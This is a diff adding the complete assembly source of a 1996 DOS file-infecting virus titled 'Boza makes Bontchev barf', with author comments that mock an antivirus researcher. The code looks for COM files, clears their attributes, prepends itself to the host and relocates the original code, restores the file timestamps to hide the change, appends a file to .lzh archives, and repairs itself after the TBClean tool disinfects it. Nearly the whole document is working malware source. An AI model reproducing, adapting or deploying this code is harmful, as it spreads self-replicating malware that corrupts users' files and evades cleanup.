@@ -1,0 +1,355 @@
+;
+; "Boza makes Bontchev barf"
+;                   by Metabolis.
+;
+;
+; When the virus is tbcleaned and run it will print either..
+;
+;      "Bad command or filename"                ; if port 40h holds a value
+;                                               ; lower than 0d2h.
+;       or
+;
+;      "Call this virus what you will.          ; if it's higher.
+;       Boza still makes Bontchev barf :P"
+;
+; The virus will then fix itself so if the user is stupid enough
+; to run it again it will keep infecting.  (Well, in a sense they're
+; not stupid, after all.. the file will work again, damn destructive
+; tbclean :)
+;
+; If there are any .lzh files in the current directory the virus will
+; add a small com file to them all.  (note: it doesn't check if the
+; archives have already been added to, so it just adds the file again,
+; no harm.. just takes up more precious hdd space I guess)
+;
+; Files larger than 0fab0h, smaller than 1002, CO as the first two
+; characters, starting with 0e9h,00,00 or with numbers in the filename
+; won't be infected.
+;
+; I'm sure there is a lot of code here that could be optimized.
+; It's lucky I don't care :)
+;
+; a86 bmbb.asm
+;
+
+        org     100h
+
+star:
+        db      0e9h,00,00                      ; jump along
+
+        mov     bx,0FECEh                       ; initialize tbclean check
+
+        mov     word ptr [101h],(die-star)-3    ; move the address of "die"
+        mov     ax,100h                         ; to 101h then jump there.
+        jmp     ax
+                                                ; it then jumps to die.
+
+        db      " 'Boza makes Bontchev Barf' by Metabolis "
+
+        ; when the virus is tbcleaned (tbclean never did handle
+        ; prependers correctly.) it gets written back to disk
+        ; with the jump to die still at 100h, so if bx ain't FECE
+        ; it has been cleaned.
+
+counter db      00h
+
+die:
+        mov     word ptr[101h],0000h            ; fix initial jump.
+
+        cmp     bx,0FECEh                       ; we been cleaned?
+        je      keepgoin                        ; no, keep going.
+
+        in      al,40h                          ; grab us a number
+        cmp     al,0d2h                         ; compare al to 210
+        jb      badcom                          ; below?
+
+        mov     dx,offset barf                  ; boza makes bontchev barf.
+        jmp     print
+
+badcom:
+        mov     dx,offset badcomm               ; bad command or filename.
+
+print:
+        mov     ah,9                            ; display stuph from ds:dx
+        int     21h
+
+        push    ds                              ; we'll be needing this
+
+        mov     si,word ptr[2ch]                ; get env seg from psp
+
+        push    si
+        pop     ds                              ; change ds to env seg
+
+        xor     bp,bp
+
+loopme:
+        mov     bx,word ptr ds:[bp]             ; grab a byte from env
+        inc     bp
+        cmp     bx,0000h
+        jne     loopme
+        inc     bp
+        mov     bx,word ptr ds:[bp]
+        cmp     bx,0001h
+        jne     loopme
+
+        inc     bp
+        inc     bp
+
+        mov     ax,3d01h                        ; open the current file
+        mov     dx,bp
+        int     21h
+
+        xchg    ax,bx                           ; the usual.
+
+        pop     ds
+
+        mov     ah,40h                          ; write 3 bytes that will
+        mov     cx,3                            ; fix the virus back up.
+        mov     dx,star
+        int     21h
+
+        mov     ah,3eh                          ; close file
+        int     21h
+
+        mov     ax,4c00h                        ; time to retreat.
+        int     21h
+
+keepgoin:
+
+        mov     byte ptr[counter],00h
+
+        mov     ah,1Ah
+        mov     dx,word ptr[total]              ; relocate the dta
+        int     21h                             ; to the very end of the virus
+                                                ; (plus infectee length)
+findfirst:
+        mov     ah,4eh
+        mov     cx,7                            ; find first file
+        mov     dx,offset fmask
+        int     21h
+        jnc     checks                          ; no error? check it out.
+        jmp     returnhost
+
+checks:
+        mov     bp,word ptr[total]              ; put filesize in cx
+        mov     cx,word ptr[bp+1ah]
+
+        cmp     cx,0fab0h                       ; too big?
+        ja      findn
+
+        cmp     cx,1002                         ; too small?
+        jb      findn
+
+        cmp     word ptr[bp+1eh],'OC'           ; command.com?
+        je      findn
+
+        mov     si,bp
+        mov     cx,8
+        xor     ax,ax
+
+looptime:
+        cmp     byte ptr [si+1eh],30h           ; this routine checks to
+        jb      cont                            ; see if there are any
+        cmp     byte ptr [si+1eh],39h           ; numbers in the filename
+        ja      cont                            ; of the infectee.
+        jmp     findn
+
+cont:
+        inc     si
+        loop    looptime
+
+        mov     ax,4301h
+        lea     dx,[bp+1eh]                     ; fix up the attributes
+        mov     cx,20h                          ; to nothing incase the
+        int     21h                             ; file is read only or
+        jc      findn                           ; something.
+
+        mov     ax,3d02;                        ; open file for read/write
+        lea     dx,[bp+1eh]
+        int     21h
+        jnc     fixhandle
+        jmp     fn
+
+fixhandle:
+        xchg    bx,ax
+
+        mov     ah,03fh                         ; read 3 bytes from file
+        mov     cx,3                            ; put in temp
+        mov     dx,offset temp
+        int     21h
+
+        cmp     word ptr[temp],00e9h            ; file infected?
+        je      fn
+
+        mov     cx,word ptr[temp]
+        add     cl,ch
+        cmp     cl,167                          ; an incognito EXE?
+        je      fn
+
+        jmp     pushups
+
+findn:
+        jmp     findnext                        ; damn jumps > 128 :|
+
+sof:
+        mov     ax,4200h                        ; seek to the beginning
+        cwd                                     ; of the file
+        xor     cx,cx
+        int     21h
+        ret
+
+pushups:
+        call    sof
+
+        mov     ah,03fh
+        mov     cx,en-star                      ; read start of infectee
+        mov     dx,word ptr[total]              ; and put it after the
+        add     dx,42                           ; relocated DTA
+        mov     si,dx
+        int     21h
+
+        mov     cx,word ptr[total]              ; could probably push
+        mov     word ptr[temp],cx               ; word ptr [total] heh
+
+        mov     cx,word ptr[bp+1ah]
+        add     cx,100h                         ; fix up the new total
+        add     cx,(en-star)                    ; file length of the infectee
+        mov     word ptr[total],cx              ; (+100h)
+
+        call    sof
+
+        mov     ah,40h
+        mov     cx,en-star                      ; write virus to file
+        mov     dx,star
+        int     21h
+
+        mov     cx,word ptr[temp]               ; restore total
+        mov     word ptr[total],cx
+
+        mov     ax,4202h                        ; seek to end of file
+        call    sof+3
+
+        mov     ah,40h                          ; write the overwritten
+        mov     cx,en-star                      ; infectee code to the
+        lea     dx,[si]                         ; end of the file.
+        int     21h
+        jc      fn
+
+        inc     byte ptr[counter]               ; increment that infect cntr.
+
+fn:
+        mov     cl,byte ptr[bp+15h]             ; restore original
+        lea     dx,[bp+1eh]                     ; attributes to the file
+        mov     ax,4301h
+        int     21h
+
+        mov     cx,word ptr[bp+16h]             ; restore date and time
+        mov     dx,word ptr[bp+18h]
+        mov     ax,5701h
+        int     21h
+
+        mov     ah,3eh                          ; close file
+        int     21h
+
+findnext:
+        cmp     byte ptr[counter],1             ; infected a file?
+        je      returnhost                      ; yea, we out.
+
+        mov     ah,4fh                          ; find another file.
+        int     21h
+        jc      returnhost
+        jmp     checks                          ; open it up
+
+returnhost:
+
+lzhtime:
+        mov     ah,4eh
+        mov     cx,7                            ; find first lzh
+        mov     dx,offset fmask2
+        int     21h
+        jc      audi
+
+openlzh:
+        mov     ax,3d01h
+        lea     dx,[bp+1eh]                     ; open it up for write axs
+        int     21h
+
+        xchg    ax,bx                           ; fix the file handle
+
+        mov     ax,4201h                        ; goto eof-1
+        mov     dx,word ptr[bp+1ah]
+        dec     dx
+        xor     cx,cx
+        int     21h
+
+        mov     ah,40h                          ; write the lzh header
+        mov     cx,enddump-dump
+        mov     dx,offset dump
+        int     21h
+
+        mov     ah,3eh                          ; close the file
+        int     21h
+
+        mov     ah,4fh                          ; find another file.
+        int     21h
+        jc      audi                            ; error? .. we out
+        jmp     openlzh
+
+audi:
+        mov     ah, 1ah
+        mov     dx, 80h                         ; DTA back to 80h
+        int     21h
+
+        mov     si,offset proced
+        mov     di,word ptr[total]              ; move the return to host
+        mov     cx,proceden-proced              ; code to the end of
+        rep     movsb                           ; everything so it doesn't
+        mov     ax,word ptr[total]              ; get overwritten.
+        jmp     ax
+
+proced:
+        mov     si,word ptr[total]
+        sub     si,en-star                      ; put everything back at
+        mov     di,100h                         ; 100h like it should be.
+        mov     cx,en-star
+        rep     movsb
+
+        mov     ax,100h                         ; ribbit.
+        jmp     ax
+proceden:
+
+barf    db      "Call this virus what you will.",0dh,0ah
+        db      "Boza still makes Bontchev barf :P$"
+
+dump:
+db 31,68,45,108,104,53,45,98,0,0,0              ; a useless com file
+db 109,0,0,0,118,90,91,32,32,1,6
+db 66,66,46,67,79,77,24,170,77,0,0
+db 0,99,82,118,174,39,3,52,69,6,127
+db 240,96,208,247,128,204,12,79,185,191,195
+db 77,93,80,188,189,225,67,11,79,124,30
+db 227,56,0,20,184,187,245,221,57,235,200
+db 199,186,135,111,132,82,2,149,108,146,150
+db 60,218,70,210,92,204,140,163,65,237,156
+db 225,125,177,35,189,173,35,83,26,185,24
+db 141,13,5,115,111,231,84,144,223,70,238
+db 139,227,11,252,154,39,168,118,158,192,0
+enddump:
+
+badcomm db      "Bad command or file name",0dh,0ah,"$"
+
+fmask   db      "*.c?m",00h
+fmask2  db      "*.lzh",00h
+temp    db      00,00,00
+total   dw      ((en-star)*2)+100h
+
+en:
+
+host:                                           ; our little host program
+        mov     ah,9
+        mov     dx,0109h
+        int     21h
+        int     20h
+        db      "Did you really want to run this?",0dh,0ah
+        db      "Metabolis - 1996","$"
+
